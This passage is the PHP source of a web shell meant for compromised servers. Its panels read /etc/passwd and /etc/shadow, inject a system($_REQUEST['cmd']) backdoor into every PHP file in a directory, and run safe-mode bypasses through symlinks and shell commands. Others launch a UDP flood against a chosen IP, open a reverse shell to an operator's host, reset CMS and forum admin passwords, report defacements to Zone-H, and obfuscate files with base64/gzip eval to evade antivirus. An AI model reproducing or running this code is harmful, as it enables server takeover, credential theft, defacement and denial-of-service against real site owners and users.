				total_copy($_SESSION['CutPath'] . "/" . $item ,$_SESSION['current_dir'] . "/" . $item);
				total_delete($_SESSION['CutPath'] . "/" . $item);
			}
			else
			{
				total_copy($_SESSION['CutPath'] . "\\" . $item ,$_SESSION['current_dir'] . "\\" . $item);
				total_delete($_SESSION['CutPath'] . "\\" . $item);
			}
		}
		$_SESSION['lastAction']="";
		
		
	}
	
}
function processDelete()
{
	global $islinux;
	foreach ($_POST['fileItem'] as $item){
		if($islinux)
		{
			total_delete($_SESSION['current_dir'] . "/" . $item);
		}
		else
			total_delete($_SESSION['current_dir'] . "\\" . $item);
	}
}

function sendEmails()
{
	global $to,$from,$replyto,$cc,$subject,$message,$attachment;
	
	
	$mail = new SimpleMail();
	
	$tos = explode(",",$to);
	foreach ($tos as $i)
	{
		$mail->setTo($i, '');
	}
	$mail->setSubject($subject);
	$mail->setFrom($from, '');
	
	$mail->addMailHeader('Reply-To', $replyto, '');
	$ccs = explode(",",$cc);
	foreach ($ccs as $a)
	{
		$mail->addMailHeader('Cc', $a, '');
	}
	//$mail->addMailHeader('Bcc', 'steve@example.com', 'Steve Jobs');
	$mail->addGenericHeader('X-PHP-Script', '');
	
	$mail->addGenericHeader('X-Mailer', 'PHP/' . phpversion());
	$mail->addGenericHeader('Content-Type', 'text/html; charset="utf-8"');
	$mail->setMessage($message);
	if($attachment!="")
	{
		$ats = explode(",",$attachment);
		foreach ($ats as $a)
		{
		//	echo "inside attachment<br>";
			$mail->addAttachment($a);
		}
	}
	$mail->setWrap(100);
	$oldphpself = $_SERVER['PHP_SELF'];
	$oldremoteaddr = $_SERVER['REMOTE_ADDR'];
	
	$_SERVER['PHP_SELF']="";
	$_SERVER['REMOTE_ADDR'] = $_SERVER['SERVER_ADDR'];
	
	$send = $mail->send();
	$_SERVER['PHP_SELF']=$oldphpself;
	$_SERVER['REMOTE_ADDR']=$oldremoteaddr;

	echo ($send) ? 'Email sent successfully' : 'Could not send email';
	return "";
}
function displayMailer()
{
	global $sendemail;
	?>
	<div class='bodyDiv'>
	<form method="post">
	<table id="db">
	<td>
	<tr><td>To:</td><td><input type="text" name="to"><td></tr>
	<tr><td>From:</td><td><input type="text" name="from"><td></tr>
	<tr><td>Cc: </td><td><input type="text" name="cc"><td></tr>
	<tr><td>Bcc: </td><td><input type="text" name="bcc"><td></tr>
	<tr><td>Reply-To: </td><td><input type="text" name="replyto"><td></tr>
	<tr><td>Subject: </td><td><input type="text" name="subject"><td></tr>
	<tr><td>Message: </td><td><td></tr>
	<tr><td colspan="2"><textarea name="message" rows="25" ></textarea><td></tr>
	<tr><td >Attachment: </td><td><input type="text" name="attachment"><td></tr>
	<tr><td></td><td><input type="submit" name="sendemail" value="send"><td></tr>
	</table>
	</form></div>
	<?php
	 if(isset($sendemail))
	 {
	 	echo "<div class='bodyDiv'>";
	 	echo sendEmails();
	 	echo "</div>";
	 }
}
function displayInfo()
{
	
	global $islinux;
	$res="<div class='bodyDiv'><table>";
	$res .= "<tr><td>php</td><td>".phpversion()."</td></tr>";
			$access = array("python"=>"python -V",
						"perl"=>"perl -e \"print \$]\"",
						"python"=>"python -V",
						"ruby"=>"ruby -v",
						"node"=>"node -v",
						"nodejs"=>"nodejs -v",
						"gcc"=>"gcc -dumpversion",
						"java"=>"java -version",
						"javac"=>"javac -version"
						);
		foreach($access as $k=>$v){
			exec($v, $version);
			//$version = execute($v);
			//$version = explode("\n", $version);
			if(isset($version[0]) and $version[0]) $version = $version[0];
			else $version = "?";
			$res .= "<tr><td>".$k."</td><td>".$version."</td></tr>";
		}
		if($islinux){
			$interesting = array(
					"/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases",
					"/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf",
					"/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
					"/etc/ssh/sshd_config",
					"/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
					"/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
					"/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
			foreach($interesting as $f){
				if(@is_file($f) && @is_readable($f)) $res .= "<tr><td><a href='".$rpath."?vf=".$f."'>".$f."</a></td><td>".$f." is readable</a></td></tr>";
			}
		}
		echo $res;
	echo "</div>";
}
function displayDomains()
{
	$f = "/etc/named.conf";
	echo "<div class='bodyDiv'>";
	if(@is_readable($f))
	{
		$file = @implode(@file("/etc/named.conf"));
		if (!$file) {
			die("# Can't Read [/etc/named.conf]");
		}
		preg_match_all("#named/(.*?).db#", $file, $r);
		$domains = array_unique($r[1]);
		{
			echo "Domains Found: " . count($domains) . "<br>";
			echo "<table ><tr><td>Domain</td><td>User</td></tr>";
			foreach ($domains as $domain) {
				$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
				echo "<tr><td>$domain</td><td>" . $user['name'] . "</td></tr>";
			}
			echo "</table>";
		}
	}
	else 
		echo $f . " not readable!";
	echo "</div>"; 
}



function ZoneH($url, $hacker, $hackmode,$reson, $site )
{
	$k = curl_init();
	curl_setopt($k, CURLOPT_URL, $url);
	curl_setopt($k,CURLOPT_POST,true);
	curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
	curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);
	return $kubra;
}

function displayZoneH()
{
	global $defacer, $hackmode, $reason,$sites;
	
	if(isset($defacer) and isset($hackmode) and isset($reason) and isset($sites))
	{	
		echo "<div class='bodyDiv'>";
		$i = 0;
		$sites = explode("\n", $sites);
		echo "<pre class=ml1 style='margin-top:5px'>";
		while($i < count($sites))
		{
			if(substr($sites[$i], 0, 4) != "http")
			{
				$sites[$i] = "http://".trim($sites[$i]);
			}
			ZoneH("http://zone-h.org/notify/single", $defacer, $hackmode, $reason, $sites[$i]);
			echo "<font class=txt size=3>Site : ".$sites[$i] ." Posted !</font><br>";
			++$i;
		}
		echo "<font class=txt size=4>Sending Sites To Zone-H Has Been Completed Successfully !! </font></pre>";
		echo "</div>";
	}	
	?>
	<div class='bodydiv'>
	<form method="post" action="">
	Notifier
	<input type="text" name="defacer" value="Attacker"/><br>
	Websites:<br>
	<textarea rows=15 name='sites'></textarea>
	<select name="hackmode">
	<option value="">--------SELECT--------</option>
		<option value="1" >known vulnerability (i.e. unpatched system)</option>
		<option value="2" >undisclosed (new) vulnerability</option>
		<option value="3" >configuration / admin. mistake</option>
		<option value="4" >brute force attack</option>
		<option value="5" >social engineering</option>
		<option value="6" >Web Server intrusion</option>
		<option value="7" >Web Server external module intrusion</option>
		<option value="8" >Mail Server intrusion</option>
		<option value="9" >FTP Server intrusion</option>
		<option value="10" >SSH Server intrusion</option>
		<option value="11" >Telnet Server intrusion</option>
		<option value="12" >RPC Server intrusion</option>
		<option value="13" >Shares misconfiguration</option>
		<option value="14" >Other Server intrusion</option>
		<option value="15" >SQL Injection</option>
		<option value="16" >URL Poisoning</option>
		<option value="17" >File Inclusion</option>
		<option value="18" >Other Web Application bug</option>
		<option value="19" >Remote administrative panel access through bruteforcing</option>
		<option value="20" >Remote administrative panel access through password guessing</option>
		<option value="21" >Remote administrative panel access through social engineering</option>
		<option value="22" >Attack against the administrator/user (password stealing/sniffing)</option>
		<option value="23" >Access credentials through Man In the Middle attack</option>
		<option value="24" >Remote service password guessing</option>
		<option value="25" >Remote service password bruteforce</option>
		<option value="26" >Rerouting after attacking the Firewall</option>
		<option value="27" >Rerouting after attacking the Router</option>
		<option value="28" >DNS attack through social engineering</option>
		<option value="29" >DNS attack through cache poisoning</option>
		<option value="30" >Not available</option>
		<option value="31" >Cross-Site Scripting</option>
	</select>
	<select name="reason">
		<option value="">--------SELECT--------</option>
		<option value="1" >Heh...just for fun!</option>
		<option value="2" >Revenge against that website</option>
		<option value="3" >Political reasons</option>
		<option value="4" >As a challenge</option>
		<option value="5" >I just want to be the best defacer</option>
		<option value="6" >Patriotism</option>
		<option value="7" >Not available</option>
	</select> 
	<input type="submit" value="Send"/></ul>
	</form>
	</div>
	<?php 
}
function displayExploit()
{
	global $exploitwebsite;
	
	
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$sversion="";
	if(strpos('Linux', $kernel) !== false)
		$sversion= urlencode('Linux Kernel ' . substr($release,0,6));
	else
		$sversion= urlencode($kernel . ' ' . substr($release,0,3));
	
	echo "<div class='bodydiv'>";
	echo "<font size='6em'><a href='http://www.exploit-db.com/search/?action=search&description=" . $sversion . "' onclick='return !window.open(this.href);'> Exploit-db </a><br>";
	
	echo "<a href='https://www.google.com/?q=" . $sversion . " Exploit' onclick='return !window.open(this.href);'> Google </a> <br>";
	
	
	
	echo "</font></div>";
	
}

function displayCodeInject()
{
	global $codeInject;
	if(isset($codeInject))
	{
		//var_dump($codeInject);
		if(isset($_SESSION['current_dir'])){
			chdir($_SESSION['current_dir']);
		}

		$handle = opendir($_SESSION['current_dir']);
		while($aux = readdir($handle)) {
			if(!is_dir($aux) and strpos($aux,".php")!==false )
			{
				file_put_contents($aux,"<?php \n" . $codeInject . " ?>" . file_get_contents($aux));
			}
		}
		@closedir($handle);
			

	}
	?>
	<div class='bodydiv'>
	<form action="">
	Inject PHP Code all .php files in current directory!<br><br>
	&lt;?
	<br>
	<textarea rows="14" name='codeInject'>
if(isset($_REQUEST["cmd"])) 
{
system($_REQUEST["cmd"]); 
}
	</textarea>
	<br>
	?&gt;
	<br>
	<br>
	<input type="submit" name="Submit" value="Inject">
	</form>
	</div>
	<?php 
}
function bypassCopy($file)
{
	if(@copy($file,"test1.php"))
	{
		$fh=fopen("test1.php",'r');
		echo "<textarea cols=120 rows=20 class=box readonly>".htmlspecialchars(@fread($fh,filesize("test1.php")))."</textarea></br></br>";
		@fclose($fh);
		unlink("test1.php");
	}
	return true;
}

function bypassImap($file)
{
		
		$stream = @imap_open($file, "", "");
		$str = @imap_body($stream, 1);
		echo "<textarea cols=120 rows=20 class=box readonly>";
		echo $str;
		echo "</textarea>";
		return true;
}
function bypassSql($file)
{
	/*
	else if(isset($_GET['sql']))
	{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		$file=$_GET['sql'];
	
		$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
		$mysql_files = explode(':', $mysql_files_str);
			
		$sql = array (
				"USE $mdb",
				'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
				"LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
				. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
				. "ESCAPED BY          '' "
				. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",
	
				"SELECT a FROM $tbl LIMIT 1"
		);
		mysql_connect ($mhost, $muser, $mpass);
	
		foreach ($sql as $statement) {
			$q = mysql_query ($statement);
	
			if ($q == false) die (
					"FAILED: " . $statement . "\n" .
					"REASON: " . mysql_error () . "\n"
			);
	
			if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;
	
			echo htmlspecialchars($r[0]);
			mysql_free_result ($q);
		}
		echo "</textarea>";
	}*/
}
function bypassCurl($file)
{

		$ch=@curl_init("file://" . $file);
		@curl_setopt($ch,CURLOPT_HEADERS,0);
		@curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		$file_out=@curl_exec($ch);
		@curl_close($ch);
		echo "<textarea cols=120 rows=20 class=box readonly>".htmlspecialchars($file_out)."</textarea></br></br>";
		return true;
}
function bypassId($file)
{
	
		echo "<textarea cols=120 rows=20 class=box readonly>";
		for($uid=0;$uid<60000;$uid++)
		{   //cat /etc/passwd
			$ara = posix_getpwuid($uid);
			if (!empty($ara))
			{
				while (list ($key, $val) = each($ara))
				{
					print "$val:";
				}
				print "\n";
			}
		}
		echo "</textarea>";
		return true;
}
function bypassTmp($file)
{
	$mytmp = tempnam ( 'tmp', $file );
	$fp = fopen ( $mytmp, 'r' );
	while(!feof($fp))
		echo fgets($fp);
	fclose ( $fp );
	return true;
}
function bypassSymlink($file)
{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		@mkdir("dat.001",0777);
		@chdir("dat.001");
		exec("ln -s  " .$file." passwd");
		echo file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/dat.001/passwd");
		echo "</textarea>";
		return true;
	
}
function bypassxxd($filename)
{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		echo @shell_exec("xxd ".$filename);
		echo "</textarea>";	
		return true;
}
function bypassrev($filename)
{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		echo @shell_exec("rev ".$filename);
		echo "</textarea>";	
		return true;
}
function bypasstac($filename)
{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		echo @shell_exec("tac ".$filename);
		echo "</textarea>";	
		return true;
}
function bypassmore($filename)
{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		echo @shell_exec("more ".$filename);
		echo "</textarea>";	
		return true;
}
function bypassless($filename)
{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		echo @shell_exec("less ".$filename);
		echo "</textarea>";	
		return true;
}

function displayBypassers()
{
	
	global $tgtfile,$islinux,$tgt;
	?>
	<div class='bodydiv'>
	
	http://ragde4.blogspot.com/2012/04/all-safemode-bypass-exploit.html<br>
	http://hackers2devnull.blogspot.com/2013/05/when-safe-mode-is-on-it-can-be-pain-to.html<br>
	http://xedlgubaid.blogspot.com/2012/05/how-to-bypass-safe-mode-on-in-server.html<br><br>
	
	<form method="post">
	File: <br><input name='tgtfile' value="/etc/passwd"> <br>
	<table id='bypass'>
	<tr><td>Bypass with Copy</td><td><input type="submit" name="tgt" value="Copy"></td></tr>
	<tr><td>Bypass with Imap</td><td><input type="submit" name="tgt" value="Imap"></td> </tr>
	<tr><td>Bypass with Curl</td><td><input type="submit" name="tgt" value="Curl"> </td></tr>
	<tr><td>Bypass with Id</td><td><input type="submit" name="tgt" value="Id"> </td></tr>
	<tr><td>Bypass with Tmpnam</td><td> <input type="submit" name="tgt" value="Tmp"></td></tr>
	<tr><td>Bypass with Symlink</td><td><input type="submit" name="tgt" value="Symlink"> </td></tr>
	<tr><td>Bypass with xxd</td><td><input type="submit" name="tgt" value="xxd"></td> </tr>
	<tr><td>Bypass with rev</td><td><input type="submit" name="tgt" value="rev"> </td></tr>
	<tr><td>Bypass with tac</td><td><input type="submit" name="tgt" value="tac"> </td></tr>
	<tr><td>Bypass with more</td><td><input type="submit" name="tgt" value="more"></td> </tr>
	<tr><td>Bypass with less</td><td><input type="submit" name="tgt" value="less"> </td></tr>
	</table>

	
	</form>
	</div>
	<?php 
	if(isset($tgtfile))
	{
		echo "<br>Bypassing " . $tgtfile . "<br>";
		if($tgt==="Copy" and bypassCopy($tgtfile)===true)
		{
			echo "bypassed";
		}
		//echo "Bypassing with Imap...<br>";
		//if(@bypassImap($tgtfile)===true)
		//{
		//	echo "bypassed!";
		//}
		//echo "Bypassing with Curl...<br>";
		//try {
			
		//	if(bypassCurl($tgtfile)===true)
		//	{
		//		echo "bypassed!";
		//	}
		//}
		//catch(Exception $e)
		//{
		//	echo $e->getMessage();
	//	}
	if($islinux)
	{
		if($tgt=="Id" and @bypassId($tgtfile)===true)
		{
			echo "bypassed!";
		}
	}
	if($tgt=="Tmp" and bypassTmp($tgtfile)===true)
	{
		echo "bypassed!";
	}
	
		if($tgt==="Symlink" and @bypassSymlink($tgtfile)===true)
		{
			echo "bypassed!";
		}
		if($tgt==="xxd" and @bypassxxd($tgtfile)===true)
		{
			echo "bypassed!";
		}
		if($tgt==="rev" and @bypassrev($tgtfile)===true)
		{
			echo "bypassed!";
		}
		if($tgt==="tac" and @bypasstac($tgtfile))
		{
			echo "bypassed!";
		}
		if($tgt==="more" and @bypassmore($tgtfile))
		{
			echo "bypassed!";
		}
		if($tgt==="less" and @bypassless($tgtfile))
		{
			echo "bypassed!";
		}
	}
}
function displayDoS()
{
	global $ip1,$exTime,$port,$timeout;
	 
	?>
	<div class='bodydiv'>
	<form method="post">
	<table>
	<tr><td>Target IP : </td><td><input name="ip1" value=""></td></tr>
	<tr><td>Target Port:</td><td> <input name="port" value=80></td></tr>
	<tr><td>Execution Time Seconds:</td><td> <input name="exTime" value=10></td></tr>
	<tr><td>Time Out:</td><td> <input name="timeout" value=5></td></tr>
	</table>
	<input type="submit" value="DoS">
	</form>
	
	
	</div>
	<?php 
	//https://github.com/drego85/DDoS-PHP-Script/blob/master/ddos.php#L6
	
	
	if(isset($ip1) and isset($port) and isset($exTime) and isset($timeout))
	{
		$pktSize = 609999;
		$data = "";
		$packets = 0;
		$counter = $pktSize;
		$maxTime = time() + $exTime;;
		while($counter--)
		{
			$data .= "X";
		}
		
		 
		while(1)
		{
			$socket = fsockopen("udp://$ip1", $port, $error, $errorString, $timeout);
			if($socket)
			{
				fwrite($socket , $data);
				fclose($socket);
				$packets++;
			}
			if(time() >= $maxTime)
			{
			break;
		}
	}
	echo "<div class='bodyDiv'>";
	echo "Dos Completed!<br>";
	echo "DOS attack against udp://$ip1:$port completed on ".date("h:i:s A")."<br />";
	echo "Total Number of Packets Sent : " . $packets . "<br />";
	echo "Total Data Sent = ". format_size($packets*$pktSize) . "<br />";
	echo "Data per packet = " . format_size($pktSize) . "<br />";
	echo "</div>";
}
	
	
	
}
function displayLogs()
{
	?>
	<div class='bodydiv'>
	Logs from server...!
	</div>
	<?php 
}
function displaySelfKill()
{
	global $KillMe;
	echo "<div class='bodyDiv'> Are you sure?<br>";
	echo "<form method='post'> <input type='Submit' name='KillMe' value='KillMe'></form>";
	if(isset($KillMe))
		total_delete( __FILE__); 
}
function displayReverseNetcat()
{
	global $ip,$port;
	?>
	<div class='bodyDiv'>
	<form method="post">
	IP :	<input name="ip">
	Port: <input name="port">
	<input  type="submit" name="submit" value="Run">
	</form>
	<br>First Run  #nc -lvp [port] , then run this script.  
	</div>
	<?php 
	if(isset($ip) and isset($port))
	{
		echo "<div class='bodyDiv'>Connecting</div>";
		reverseNetcat();
	}
	
}
function reverseNetcat()
{
	global $daemon,$ip,$port;

	set_time_limit (0);
	//$ip = $_REQUEST['ip']; //'127.0.0.1';  // CHANGE THIS
	//$port = $_REQUEST['port'];  //1234;       // CHANGE THIS
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; /bin/sh -i';
	$daemon = 0;
	$debug = 0;
	
	//
	// Daemonise ourself if possible to avoid zombies later
	//
	
	// pcntl_fork is hardly ever available, but will allow us to daemonise
	// our php process and avoid zombies.  Worth a try...
	if (function_exists('pcntl_fork')) {
		// Fork and have the parent process exit
		$pid = pcntl_fork();
	
		if ($pid == -1) {
			printit("ERROR: Can't fork");
			exit(1);
		}
	
		if ($pid) {
			exit(0);  // Parent exits
		}
	
		// Make the current process a session leader
		// Will only succeed if we forked
		if (posix_setsid() == -1) {
			printit("Error: Can't setsid()");
			exit(1);
		}
	
		$daemon = 1;
	} else {
		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
	}
	
	// Change to a safe directory
	chdir("/");
	
	// Remove any umask we inherited
	umask(0);
	
	//
	// Do the reverse shell...
	//
	
	// Open reverse connection
	$sock = fsockopen($ip, $port, $errno, $errstr, 30);
	if (!$sock) {
		printit("$errstr ($errno)");
		exit(1);
	}
	
	// Spawn shell process
	$descriptorspec = array(
			0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
			1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
			2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);
	
	$process = proc_open($shell, $descriptorspec, $pipes);
	
	if (!is_resource($process)) {
		printit("ERROR: Can't spawn shell");
		exit(1);
	}
	
	// Set everything to non-blocking
	// Reason: Occsionally reads will block, even though stream_select tells us they won't
	stream_set_blocking($pipes[0], 0);
	stream_set_blocking($pipes[1], 0);
	stream_set_blocking($pipes[2], 0);
	stream_set_blocking($sock, 0);
	
	printit("Successfully opened reverse shell to $ip:$port");
	
	while (1) {
		// Check for end of TCP connection
		if (feof($sock)) {
			printit("ERROR: Shell connection terminated");
			break;
		}
	
		// Check for end of STDOUT
		if (feof($pipes[1])) {
			printit("ERROR: Shell process terminated");
			break;
		}
	
		// Wait until a command is end down $sock, or some
		// command output is available on STDOUT or STDERR
		$read_a = array($sock, $pipes[1], $pipes[2]);
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	
		// If we can read from the TCP socket, send
		// data to process's STDIN
		if (in_array($sock, $read_a)) {
			if ($debug) printit("SOCK READ");
			$input = fread($sock, $chunk_size);
			if ($debug) printit("SOCK: $input");
			fwrite($pipes[0], $input);
		}
	
		// If we can read from the process's STDOUT
		// send data down tcp connection
		if (in_array($pipes[1], $read_a)) {
			if ($debug) printit("STDOUT READ");
			$input = fread($pipes[1], $chunk_size);
			if ($debug) printit("STDOUT: $input");
			fwrite($sock, $input);
		}
	
		// If we can read from the process's STDERR
		// send data down tcp connection
		if (in_array($pipes[2], $read_a)) {
			if ($debug) printit("STDERR READ");
			$input = fread($pipes[2], $chunk_size);
			if ($debug) printit("STDERR: $input");
			fwrite($sock, $input);
		}
	}
	
	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);
	
}


function printit ($string) {
	global $daemon;
	if (!$daemon) {
		print "$string\n";
	}
}
function displayPortScanner()
{
	global $tgtip,$proto;
	if(!isset($tgtip))
	{
		$tgtip='localhost';
	}
	?>
	<div class='bodyDiv'>
	<form method="post">
	Target: <input name='tgtip' value='<?php echo $tgtip;?>' ><br>
	<input type="radio" value="tcp" name="proto"> TCP <br>
	<input type="radio" value="udp" name="proto"> UDP <br>
	<input type="submit" value="Scan">
	</form>
	</div>
	<div class='bodyDiv'>
	<?php 
	
	if(isset($proto))
	{
		echo "Open Ports: ";
		$myports = array("21","22","23","25","59","80","113","135","445","1025","5000","5900","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
		for($current = 0; $current <= 23; $current++)
		{
			$currents = $myports[$current];
			$service = getservbyport($currents, $proto);
			// Try to connect to port
			$result = @fsockopen($tgtip, $currents, $errno, $errstr, 1);
			// Show results
			if($result)
			{
				echo "<font class=txt>$currents, </font>";
				flush();
			}
		}
	}
	echo "</div>";
}

function displayForums()
{
	global $faction;
	?>
	<div class='bodydiv'>
	<form method="post">
	<table id='db'>
	<tr><td>DB Host:</td><td> <input name='dbhost'></td></tr>
	<tr><td>DB Name:</td><td><input name='dbname'></td></tr>
	<tr><td>DB User:</td><td> <input name='dbusername'></td></tr>
	<tr><td>DB Pass:</td><td> <input name='dbpassword'></td></tr>
	<tr><td>Forum: </td><td><select  name="forum" ">
	<option value="wp">Wordpress</option>
	<option value="joomla">Joomla</option>
	<option value="vb">vBulletin</option>
	<option value="phpbb">phpBB</option>
	<option value="mybb">MyBB</option>
	
	

	</select></td></td></tr>
	<tr><td>User:</td><td> <input name='username'></td></tr>
	<tr><td>New Pass:</td><td> <input name='newpassword'></td></tr>
	<tr><td>Table Prefix:</td><td> <input name='prefix'></td></tr>
	
	</table>
	<input type="submit" name='faction' value='ChangeForumPass'><br><br>
	<textarea rows="3" name='defacedata'></textarea><br><br>
		<input type="submit" name='faction' value='DefaceForum'>
	
	</form>
	
	</div>
	<?php 
	if(isset($faction) and $faction==='ChangeForumPass')
	{
		changeForumPassword();
	}
	if(isset($faction) and $faction==='DefaceForum')
	{
		defaceForums();
	}
}

function changeForumPassword()
{
	global $dbhost,$dbname,$dbusername,$dbpassword,$forum,$defacedata,$username,$newpassword,$prefix;
	//echo "db host ".$dbhost."db name ".$dbname."db username ".$dbusername.
	//"db pass ".$dbpassword."forums ".$forums."db defacedata: ".$defacedata;
	//echo "this is change forum password";
	if($forum === "wp")
	{
		
		
		$con = mysql_connect($dbhost,$dbusername,$dbpassword);
		$db = mysql_select_db($dbname,$con);
	
		$newpassword = md5($newpassword);
		if($prefix == "" || $prefix == null)
			$sql = mysql_query("update wp_users set user_pass = '$newpassword' where user_login = '$username'");
		else
			$sql = mysql_query("update ".$prefix."users set user_pass = '$newpassword' where user_login = '$username'");
		if($sql)
		{
			mysql_close($con);
			echo "<font class=txt>Password Changed Successfully</font>";
		}
		else
			echo "Cannot Change Password";
	}
	if($forum === "joomla")
	{
		$con = mysql_connect($dbhost,$dbusername,$dbpassword);
		$db = mysql_select_db($dbname,$con);
	
		$newpassword = md5($newpassword);
		if($prefix == "" || $prefix == null)
			$sql = mysql_query("update josvk_users set password = '$newpassword' where username = '$username' ");
		else
			$sql = mysql_query("update ".$prefix."users set password = '$newpassword'  where username = '$username' ");
		if($sql)
		{
			mysql_close($con);
			echo "<font class=txt>Password Changed Successfully</font>";
		}
		else
			echo "Cannot Change Password";
	}
	if($forum === "phpbb")
	{
		//echo "db host ".$dbhost."db name ".$dbname."db username ".$dbusername.
	//	"db pass ".$dbpassword."forums ".$forum."db defacedata: ".$defacedata
	//	."new pass: ".$newpassword ."db username: ".$username;
		$con = mysql_connect($dbhost,$dbusername,$dbpassword);
		$db = mysql_select_db($dbname,$con);
	
		$newpassword = md5($newpassword);
		if($prefix == "" || $prefix == null)
			$sql = mysql_query("update phpbb_users set user_password = '$newpassword' where username = '$username' ");
		else
			$sql = mysql_query("update ".$prefix."users set user_password = '$newpassword'  where username = '$username' ");
		if($sql)
		{
			mysql_close($con);
			echo "<font class=txt>Password Changed Successfully</font>";
		}
		else
			echo "Cannot Change Password";
	}
	if($forum === "mybb")
	{
		$con = mysql_connect($dbhost,$dbusername,$dbpassword);
		$db = mysql_select_db($dbname,$con);
		$salt="00700700";
		$newpassword = md5(md5($salt).md5($newpassword));
		if($prefix == "" || $prefix == null)
			$sql = mysql_query("update mybb_users set password = '$newpassword',salt = '$salt'
					 where username = '$username' ");
		else
			$sql = mysql_query("update ".$prefix."users set password = '$newpassword',salt = '$salt'
				where username = '$username' ");
		if($sql)
		{
			mysql_close($con);
			echo "<font class=txt>Password Changed Successfully</font>";
		}
		else
			echo "Cannot Change Password";
	}
	if($forum === "vb")
	{
		$con = mysql_connect($dbhost,$dbusername,$dbpassword);
		$db = mysql_select_db($dbname,$con);
		$salt="00700700";
		$newpassword = md5(md5($newpassword) . $salt);
		if($prefix == "" || $prefix == null)
			$sql = mysql_query("update user set password = '$newpassword',salt = '$salt'
					where username = '$username' ");
		else
			$sql = mysql_query("update ".$prefix."users set password = '$newpassword',salt = '$salt'
					where username = '$username' ");
		if($sql)
		{
			mysql_close($con);
			echo "<font class=txt>Password Changed Successfully</font>";
		}
		else
			echo "Cannot Change Password";
	}
}
function defaceForums()
{
	global $dbhost,$dbname,$dbusername,$dbpassword,$forum,$defacedata,$newusername,$newpassword;
	//echo $dbhost.$dbname.$dbusername.$dbpassword.$forums.$defacedata;
	echo "this is deface forum!";
}
function displayEvadeAV()
{
	global $file1,$file2;
	?>
		<div class='bodydiv'>
		<form method="post">
		Input Filename: <input name="file1"> Output Filename: <input name="file2"> <br>
		<input type="submit" value='EvadeAV' >
		</form>
		</div>
		<?php 
		if(isset($file1) and isset($file2))
		{
			$data = file_get_contents($file1);
			$dataEncoded = base64_encode(gzcompress($data,9));
			$ev1 = "\$tmp='{$dataEncoded}';"; 
				
			$ev2 = "\$tmp1 = gzuncompress(base64_decode(\$tmp));";
			
			$output = "<?php {$ev1} 
			{$ev2} 
			eval(\"?>\".\$tmp1.\"<?php;\"); 
			?>";
			
			file_put_contents($file2,$output);
		}
}
?>
